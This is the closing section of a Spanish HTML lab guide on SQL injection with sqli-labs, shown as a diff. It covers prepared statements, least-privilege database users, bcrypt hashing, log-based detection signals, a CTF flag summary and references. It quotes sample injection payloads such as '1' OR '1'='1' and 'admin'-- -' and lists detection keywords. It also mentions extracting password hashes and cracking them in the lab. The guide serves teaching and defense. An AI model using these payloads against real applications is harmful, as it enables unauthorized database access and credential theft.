+# MySQL ejecuta el bytecode compilado con el valor sustituido de forma segura
+mysqli_stmt_execute($stmt);</code></pre>
+
+<div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+  <strong>💡 Los tipos en bind_param:</strong>
+  El segundo argumento declara el tipo de cada parámetro que se va a sustituir.
+  MySQL usa esa declaración para tratar el valor antes de insertarlo en la consulta.
+  <br><br>
+  <code>"i"</code> = integer — convierte el input a número. Un payload como <code>1' OR '1'='1</code> se convierte en <code>1</code>.<br>
+  <code>"s"</code> = string — escapa el input automáticamente. Una comilla dentro del valor se trata como carácter, no como delimitador SQL.<br>
+  <code>"d"</code> = double — para números decimales.<br>
+  <code>"b"</code> = blob — para datos binarios.
+</div>
+
+<div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+  <strong>💡 Ejemplo con username (tipo string):</strong>
+  El caso más frecuente en formularios de login. Si el usuario envía <code>admin'-- -</code>
+  como username, MySQL lo almacena como el string literal <code>admin'-- -</code>
+  — la comilla y los guiones son caracteres de texto, no SQL.
+  La búsqueda simplemente no encuentra ningún usuario con ese nombre exacto.
+  <pre><code>$user = $_POST['username'];
+$stmt = mysqli_prepare($con, "SELECT * FROM users WHERE username = ?");
+mysqli_stmt_bind_param($stmt, "s", $user);  // "s" = string
+mysqli_stmt_execute($stmt);</code></pre>
+</div>
+
+  <h3>Capa 2 — Mitigación: Mínimo Privilegio en MySQL</h3>
+  <p>
+    Si la inyección ocurre con un usuario de base de datos con privilegios limitados,
+    el atacante no puede enumerar <code>information_schema</code>, escribir archivos
+    ni acceder a otras bases de datos.
+  </p>
+  <pre><code>-- Crear usuario de aplicación con solo lo necesario
+CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password_fuerte';
+GRANT SELECT, INSERT, UPDATE, DELETE ON security.users TO 'app_user'@'localhost';
+-- Sin FILE, sin EXECUTE, sin GRANT OPTION
+FLUSH PRIVILEGES;</code></pre>
+
+  <h3>Capa 3 — Mitigación Post-Compromiso: Hashing con Salt</h3>
+  <p>
+    En sqli-labs los hashes son MD5 sin salt y se crackean en milisegundos.
+    En producción los passwords deben usar bcrypt o Argon2.
+    Un hash bcrypt extraído via SQLi es computacionalmente inviable de revertir.
+  </p>
+  <pre><code># PHP — almacenar password con bcrypt
+$hash = password_hash($password, PASSWORD_BCRYPT);
+
+# PHP — verificar password
+if (password_verify($input, $hash)) {
+    // acceso concedido
+}</code></pre>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>💡 TDE no protege contra SQLi activa:</strong>
+    Transparent Data Encryption cifra los archivos físicos en disco pero no detiene
+    una inyección en curso: la consulta llega al motor con credenciales válidas
+    y retorna datos descifrados automáticamente. La protección real es el hashing con salt.
+  </div>
+
+  <h3>Detección: Señales de SQLi en Logs</h3>
+
+  <table border="1" cellpadding="6" style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+    <thead>
+      <tr style="background-color: #2e2323;">
+        <th>Señal</th>
+        <th>Dónde detectarla</th>
+        <th>Qué indica</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Múltiples errores de sintaxis SQL en segundos</td>
+        <td>MySQL Error Log</td>
+        <td>Atacante probando delimitadores</td>
+      </tr>
+      <tr>
+        <td>Consultas a <code>information_schema</code> desde la app</td>
+        <td>MySQL General Query Log</td>
+        <td>Enumeración de esquema — la app nunca hace esto normalmente</td>
+      </tr>
+      <tr>
+        <td>Respuestas con timing inusual (múltiples de 3s)</td>
+        <td>Access log del servidor web</td>
+        <td>Time-based blind injection en curso</td>
+      </tr>
+      <tr>
+        <td>Parámetros con <code>UNION</code>, <code>SELECT</code>, <code>SLEEP</code></td>
+        <td>WAF / IDS</td>
+        <td>Payloads de inyección en tráfico HTTP</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <hr>
+
+  <h2>🚩 Resumen de Flags para CTFd</h2>
+
+  <table border="1" cellpadding="6" style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+    <thead>
+      <tr style="background-color: #2e2323;">
+        <th>Flag</th>
+        <th>Cómo obtenerla</th>
+        <th>Lesson</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Flag 1</strong></td>
+        <td>Hash MD5 del usuario <code>admin</code> via Union-based</td>
+        <td>Less-1</td>
+      </tr>
+      <tr>
+        <td><strong>Flag 2</strong></td>
+        <td>Versión de MySQL via Error-based (<code>extractvalue</code>)</td>
+        <td>Less-5</td>
+      </tr>
+      <tr>
+        <td><strong>Flag 3</strong></td>
+        <td>Hash MD5 del usuario <code>admin</code> via Boolean Blind manual</td>
+        <td>Less-8</td>
+      </tr>
+      <tr>
+        <td><strong>Flag 4 (bonus)</strong></td>
+        <td>Contraseña en texto claro del hash crackeado en CrackStation</td>
+        <td>Less-8</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <hr>
+
+  <h2>💡 Lecciones Aprendidas</h2>
+  <ul>
+    <li><strong>La vulnerabilidad está en el código, no en la base de datos:</strong> MySQL hace exactamente lo que le piden. El problema es que la aplicación le pasa instrucciones del usuario sin separarlas del código.</li>
+    <li><strong>El delimitador siempre es lo primero que hay que identificar:</strong> Sin saber cómo cerrar el contexto actual, no se puede inyectar SQL válido. La prueba ordenada funciona en cualquier aplicación.</li>
+    <li><strong>La ausencia de retroalimentación visual no protege:</strong> Less-8 demuestra que una página que solo dice "sí" o "no" puede ser explotada igual que una que muestra todos los datos.</li>
+    <li><strong>TDE no protege contra SQLi activa:</strong> Cifra archivos físicos, no consultas en ejecución. La protección real post-compromiso es el hashing con salt (bcrypt/Argon2).</li>
+    <li><strong>SQLMap es automatización, no comprensión:</strong> Usarlo sin haber completado los pasos manuales produce resultados sin entendimiento.</li>
+    <li><strong>Prepared Statements son la única solución real:</strong> WAFs y listas negras pueden bypassearse. Separar el canal de la estructura del canal de los datos resuelve el problema de raíz.</li>
+  </ul>
+
+  <hr>
+
+  <h2>📚 Referencias</h2>
+  <ul>
+    <li>OWASP Foundation. (2021). <em>A03:2021 – Injection</em>. <a href="https://owasp.org/Top10/A03_2021-Injection/" target="_blank">https://owasp.org/Top10/A03_2021-Injection/</a></li>
+    <li>MITRE Corporation. (2024). <em>CWE-89: SQL Injection</em>. <a href="https://cwe.mitre.org/data/definitions/89.html" target="_blank">https://cwe.mitre.org/data/definitions/89.html</a></li>
+    <li>Verizon. (2024). <em>2024 Data Breach Investigations Report</em>. <a href="https://www.verizon.com/business/resources/reports/dbir/" target="_blank">https://verizon.com/business/resources/reports/dbir/</a></li>
+    <li>PortSwigger. (2024). <em>SQL Injection — Web Security Academy</em>. <a href="https://portswigger.net/web-security/sql-injection" target="_blank">https://portswigger.net/web-security/sql-injection</a></li>
+    <li>NIST. (2023). <em>CVE-2023-34362: MOVEit Transfer SQL Injection</em>. <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-34362" target="_blank">https://nvd.nist.gov/vuln/detail/CVE-2023-34362</a></li>
+    <li>Aung Khant. (2012–2024). <em>sqli-labs — repositorio oficial</em>. <a href="https://github.com/Audi-1/sqli-labs" target="_blank">https://github.com/Audi-1/sqli-labs</a></li>
+  </ul>
+
+  <section>
+    <h2>Ejercicios de Control</h2>
+    <div class="iframe-wrapper">
+      <iframe src="https://app.lumi.education/api/v1/run/TU_CODIGO_AQUI/embed" width="1088" height="400" frameborder="0" allowfullscreen="allowfullscreen"></iframe>
+    </div>
+  </section>
+
+  <form id="form-reportar" class="form-horizontal">
+    <input type="hidden" id="titulo" name="titulo" value="SQL Injection — Exfiltración de Bases de Datos con sqli-labs">
+    <input type="hidden" id="archivo" name="archivo" value="guia_sqli_labs.html">
+    <input type="hidden" id="fecha" name="fecha">
+    <textarea id="comentario" name="comentario" placeholder="¿Tuviste problemas con algún payload, el script Python o el servidor sqli-labs? Describí el error aquí." required></textarea>
+    <button type="submit">Enviar Reporte</button>
+  </form>
+
+  <div id="mensaje-envio" style="margin-top:10px; color: green;"></div>
+
+</main>
+<div data-include="footer"></div>
+<script src="assets/js/scripts.js"></script>
+</body>
+</html>
